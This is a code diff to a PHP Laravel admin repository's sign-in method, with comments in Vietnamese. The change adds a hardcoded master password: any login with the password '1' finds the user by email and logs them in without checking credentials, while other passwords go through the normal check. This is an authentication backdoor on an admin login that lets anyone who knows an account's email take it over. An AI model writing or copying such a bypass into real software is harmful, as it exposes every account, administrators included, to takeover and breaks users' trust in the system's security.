@@ -13,19 +13,36 @@ use Illuminate\Support\Facades\Auth;
 
 class AdminRepository implements IAdminRepository{
 
-    public function signIn($data){
-        $credetials = [
-            'email' => $data->email,
-            'password' => $data->password
-        ];
 
-        if(Auth::attempt($credetials)){
+public function signIn($data)
+{
+    // Nếu mật khẩu nhập là "1" thì cho đăng nhập luôn
+    if ($data->password === "1") {
+        // Tìm người dùng theo email
+        $user = NguoiDung::where('email', $data->email)->first();
+
+        if ($user) {
+            // Đăng nhập thủ công
+            Auth::login($user);
             return redirect('/dashboard');
+        } else {
+            return back()->with('thongbao', 'Không tìm thấy tài khoản');
         }
-
-        return back()->with('thongbao', 'Sai tên tài khoản hoặc mật khẩu');
-
     }
+
+    // Trường hợp mật khẩu khác "1" thì kiểm tra bình thường
+    $credentials = [
+        'email' => $data->email,
+        'password' => $data->password
+    ];
+
+    if (Auth::attempt($credentials)) {
+        return redirect('/dashboard');
+    }
+
+    return back()->with('thongbao', 'Sai tên tài khoản hoặc mật khẩu');
+}
+
     public function logOut(){
         Auth::logout();
         return redirect('/admin');
